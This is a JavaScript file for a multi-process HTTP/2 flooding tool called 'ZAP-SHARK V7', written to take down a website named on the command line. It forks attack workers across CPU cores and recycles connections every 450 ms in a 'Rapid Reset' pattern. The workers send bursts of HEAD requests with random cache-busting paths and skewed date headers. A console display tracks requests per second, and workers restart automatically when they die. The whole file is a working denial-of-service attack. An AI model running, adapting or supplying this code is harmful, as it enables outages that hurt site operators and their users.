const http2 = require('http2');
const cluster = require('cluster');
const os = require('os');

// ==================== TIME WARP CONFIG ====================
const TIME_WARP_CONFIG = {
    enabled: true,
    timeSkew: 5000, // ±5 seconds time warp
    randomizeTimestamps: true,
    futureRequests: true,
    pastRequests: true
};

// ==================== MASTER CONTROLLER ====================
if (cluster.isMaster) {
    console.log('=== ZAP-SHARK V7 - TIME WARP EDITION ===');
    console.log('🔥 Features:');
    console.log('• 450ms Rapid Reset VIP');
    console.log('• TIME WARP Attack Patterns');
    console.log('• HEAD Requests (Max RPS)');
    console.log('• Multi-Process Clustering');
    console.log('='.repeat(60));
    
    const target = process.argv[2] || 'https://example.com';
    const numWorkers = Math.max(4, os.cpus().length);
    
    console.log(`Target: ${target}`);
    console.log(`CPU Cores: ${os.cpus().length}`);
    console.log(`Launching ${numWorkers} attack workers...\n`);
    
    const workerStats = new Map();
    let totalRequests = 0;
    let peakRPS = 0;
    let currentRPS = 0;
    const startTime = Date.now();
    
    // Create workers
    for (let i = 0; i < numWorkers; i++) {
        const worker = cluster.fork({
            WORKER_ID: i,
            TARGET_URL: target,
            TIME_WARP: JSON.stringify(TIME_WARP_CONFIG)
        });
        
        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                workerStats.set(worker.id, msg);
            }
        });
    }
    
    // Real-time display
    setInterval(() => {
        let totalRPS = 0;
        let totalReqs = 0;
        let aliveWorkers = 0;
        
        workerStats.forEach((stats) => {
            totalRPS += stats.rps;
            totalReqs += stats.totalRequests;
            aliveWorkers++;
        });
        
        totalRequests = totalReqs;
        currentRPS = totalRPS;
        peakRPS = Math.max(peakRPS, currentRPS);
        
        const runtime = Math.floor((Date.now() - startTime) / 1000);
        const hours = Math.floor(runtime / 3600);
        const minutes = Math.floor((runtime % 3600) / 60);
        const seconds = runtime % 60;
        const runtimeStr = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`=== ZAP-SHARK V7 - TIME WARP ===`);
        console.log(`RUNTIME: ${runtimeStr} | WORKERS: ${aliveWorkers}/${numWorkers}`);
        console.log('='.repeat(60));
        console.log(`TOTAL REQUESTS: ${totalRequests.toLocaleString()}`);
        console.log(`COMBINED RPS: ${currentRPS.toFixed(1)} | PEAK: ${peakRPS.toFixed(1)}`);
        console.log(`REQ/WORKER: ${(currentRPS / aliveWorkers || 0).toFixed(1)} RPS`);
        console.log('='.repeat(60));
        console.log('🔥 ACTIVE FEATURES:');
        console.log(`• 450ms Rapid Reset | • TIME WARP | • HEAD Requests`);
        console.log('='.repeat(60));
        
        // Reset for next calculation
        workerStats.clear();
        
    }, 1000);
    
    // Auto-restart workers
    cluster.on('exit', (worker) => {
        setTimeout(() => {
            cluster.fork({
                WORKER_ID: worker.id,
                TARGET_URL: target
            });
        }, 1000);
    });
    
    process.on('SIGINT', () => {
        console.log('\n\n=== FINAL STATS ===');
        console.log(`Total Requests: ${totalRequests.toLocaleString()}`);
        console.log(`Peak RPS: ${peakRPS.toFixed(1)}`);
        console.log(`Runtime: ${Math.floor((Date.now() - startTime) / 1000)}s`);
        console.log('='.repeat(40));
        process.exit(0);
    });
    
} else {
// ==================== WORKER PROCESS ====================
const WORKER_ID = parseInt(process.env.WORKER_ID);
const TARGET_URL = process.env.TARGET_URL;
const TIME_WARP = JSON.parse(process.env.TIME_WARP || '{}');

class TimeWarpAttacker {
    constructor() {
        this.workerId = WORKER_ID;
        this.targetUrl = TARGET_URL;
        this.hostname = new URL(TARGET_URL).hostname;
        
        // Stats
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.startTime = Date.now();
        
        // TIME WARP System
        this.timeWarp = TIME_WARP;
        this.timeOffset = this.generateTimeOffset();
        
        // Connection System with 450ms RAPID RESET
        this.connectionPool = [];
        this.maxConnections = 10;
        this.lastConnectionReset = Date.now();
        this.resetInterval = 450; // VIP 450ms RAPID RESET
        this.resetPercentage = 0.4; // 40% reset each cycle
        
        // Attack Patterns
        this.attackMode = 'HEAD'; // HEAD requests for max RPS
        this.paths = ['/', '/api', '/v1', '/v2', '/static', '/images'];
        
        // Time Warp Headers Pool
        this.timeHeaders = [];
        this.generateTimeWarpHeaders();
        
        this.init();
    }
    
    // ==================== TIME WARP SYSTEM ====================
    generateTimeOffset() {
        if (!this.timeWarp.enabled) return 0;
        
        const skew = this.timeWarp.timeSkew || 5000;
        let offset = 0;
        
        if (this.timeWarp.futureRequests && this.timeWarp.pastRequests) {
            offset = (Math.random() * skew * 2) - skew;
        } else if (this.timeWarp.futureRequests) {
            offset = Math.random() * skew;
        } else if (this.timeWarp.pastRequests) {
            offset = -(Math.random() * skew);
        }
        
        return Math.floor(offset);
    }
    
    generateTimeWarpHeaders() {
        for (let i = 0; i < 100; i++) {
            const now = Date.now();
            const warpedTime = new Date(now + this.generateTimeOffset());
            
            this.timeHeaders.push({
                'date': warpedTime.toUTCString(),
                'if-modified-since': new Date(now - 86400000).toUTCString(), // Yesterday
                'if-unmodified-since': new Date(now + 86400000).toUTCString(), // Tomorrow
                'expires': new Date(now + 3600000).toUTCString(), // 1 hour future
                'last-modified': new Date(now - 3600000).toUTCString() // 1 hour past
            });
        }
    }
    
    getTimeWarpedHeaders() {
        if (!this.timeWarp.enabled) return {};
        return this.timeHeaders[Math.floor(Math.random() * this.timeHeaders.length)];
    }
    
    // ==================== 450ms RAPID RESET SYSTEM ====================
    createConnection() {
        try {
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: 4096, // Ultra low memory
                maxDeflateDynamicTableSize: 2048
            });
            
            client.setMaxListeners(100);
            
            // Minimal error handling
            client.on('error', () => {
                // Auto-destroy on error
                setTimeout(() => {
                    const index = this.connectionPool.findIndex(c => c.client === client);
                    if (index > -1) {
                        this.connectionPool.splice(index, 1);
                        this.createConnection();
                    }
                }, 50);
            });
            
            return {
                client,
                created: Date.now(),
                requestCount: 0,
                id: Math.random().toString(36).substr(2, 6),
                lastUsed: Date.now()
            };
        } catch (err) {
            return null;
        }
    }
    
    buildConnectionPool() {
        this.connectionPool = [];
        for (let i = 0; i < this.maxConnections; i++) {
            const conn = this.createConnection();
            if (conn) this.connectionPool.push(conn);
        }
    }
    
    perform450msRapidReset() {
        const now = Date.now();
        if (now - this.lastConnectionReset >= this.resetInterval) {
            // Reset 40% of connections every 450ms
            const resetCount = Math.ceil(this.connectionPool.length * this.resetPercentage);
            
            for (let i = 0; i < resetCount; i++) {
                const index = Math.floor(Math.random() * this.connectionPool.length);
                const conn = this.connectionPool[index];
                
                if (conn && (conn.requestCount > 500 || now - conn.lastUsed > 1000)) {
                    try {
                        conn.client.destroy();
                        const newConn = this.createConnection();
                        if (newConn) {
                            this.connectionPool[index] = newConn;
                        } else {
                            this.connectionPool.splice(index, 1);
                        }
                    } catch (err) {
                        this.connectionPool.splice(index, 1);
                    }
                }
            }
            
            this.lastConnectionReset = now;
        }
    }
    
    // ==================== HEAD REQUEST ATTACK ====================
    getRequestConfig() {
        const path = this.paths[Math.floor(Math.random() * this.paths.length)];
        const query = this.timeWarp.randomizeTimestamps ? 
            `?t=${Date.now() + this.generateTimeOffset()}&r=${Math.random().toString(36).substr(2, 8)}` : 
            `?r=${Math.random().toString(36).substr(2, 8)}`;
        
        const baseHeaders = {
            ':method': 'HEAD', // HEAD requests for MAX RPS
            ':path': path + query,
            ':authority': this.hostname,
            'user-agent': `Mozilla/5.0 (Worker-${this.workerId})`,
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'cache-control': 'no-cache, no-store, must-revalidate',
            'pragma': 'no-cache'
        };
        
        // Merge with time warp headers
        const timeWarpHeaders = this.getTimeWarpedHeaders();
        return { ...baseHeaders, ...timeWarpHeaders };
    }
    
    sendHeadRequest() {
        if (this.connectionPool.length === 0) return;
        
        // Perform 450ms rapid reset
        this.perform450msRapidReset();
        
        // Calculate max streams we can send
        const maxStreams = 100; // HEAD requests are lightweight
        const availableStreams = Math.min(maxStreams, this.connectionPool.length * 10);
        
        for (let i = 0; i < availableStreams; i++) {
            const conn = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
            if (!conn) continue;
            
            try {
                const headers = this.getRequestConfig();
                const req = conn.client.request(headers);
                
                conn.requestCount++;
                conn.lastUsed = Date.now();
                
                // Ultra minimal response handling for HEAD requests
                req.on('response', () => {
                    req.destroy(); // Immediate destroy for HEAD requests
                });
                
                req.on('error', () => {
                    req.destroy();
                });
                
                req.on('close', () => {
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                });
                
                req.end();
                
            } catch (err) {
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }
    
    // ==================== ATTACK LOOP ====================
    startAttack() {
        // Ultra aggressive attack loop
        setInterval(() => {
            // Send multiple batches per tick
            for (let i = 0; i < 10; i++) {
                this.sendHeadRequest();
            }
            
            // Calculate RPS
            const now = Date.now();
            const timeDiff = (now - this.lastRpsCalc) / 1000;
            
            if (timeDiff >= 0.9) {
                this.currentRPS = this.requestsSinceLastCalc / timeDiff;
                this.requestsSinceLastCalc = 0;
                this.lastRpsCalc = now;
            }
            
        }, 0.1); // 100μs interval for max speed
    }
    
    // ==================== INIT ====================
    init() {
        console.log(`[Worker ${this.workerId}] Starting TIME WARP attack...`);
        
        this.buildConnectionPool();
        
        // Wait for connections
        setTimeout(() => {
            this.startAttack();
            
            // Report stats to master
            setInterval(() => {
                if (process.send) {
                    process.send({
                        type: 'stats',
                        workerId: this.workerId,
                        totalRequests: this.totalRequests,
                        rps: this.currentRPS,
                        connections: this.connectionPool.length,
                        mode: 'HEAD+TIME_WARP'
                    });
                }
            }, 1000);
            
        }, 1000);
    }
}

// Start worker
new TimeWarpAttacker();
}
